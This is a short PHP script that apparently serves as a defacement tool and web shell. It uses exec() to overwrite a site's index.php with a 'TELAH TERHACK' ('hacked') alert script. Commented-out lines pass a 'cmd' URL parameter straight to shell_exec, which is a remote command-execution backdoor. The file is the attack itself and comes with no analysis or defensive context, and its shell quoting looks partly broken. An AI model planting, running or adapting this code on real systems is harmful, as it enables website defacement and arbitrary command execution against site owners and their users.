<?php

    $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : "";

    $script = "echo '<script>alert(TELAH TERHACK.);</script>';";

    echo exec("echo -e > ~/weshop/index.php $script");

    // echo "<pre>";
    // echo shell_exec("$cmd");
    // echo "</pre>";


?>